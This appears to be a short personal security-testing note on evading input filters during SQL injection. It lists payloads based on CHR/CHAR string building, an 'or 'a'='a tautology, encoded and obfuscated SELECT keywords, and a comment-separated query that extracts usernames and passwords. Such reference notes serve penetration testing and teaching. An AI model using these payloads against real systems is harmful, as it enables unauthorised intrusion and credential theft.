### SQL - Bypass filters
Tags: #sqli 
Author:
Reference:

#### Notes
**Summary**: covers some techniques to bypass filters
**Notes**:
- the following two queries for Oracle and MS-SQL, respectively, are the equivalent of `select ename, sal from emp where ename=’marcus’:`
```sql
SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||
CHR(114)||CHR(99)||CHR(117)||CHR(115)

# second one 

SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)
+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
```

- if comments are block then
```sql
‘ or 1=1-- #blocked

#you can inject:

‘ or ‘a’=’a
```
- if keyword like SELECT is blocked
```sql
SeLeCt
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
```
- 
```sql
  SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
```
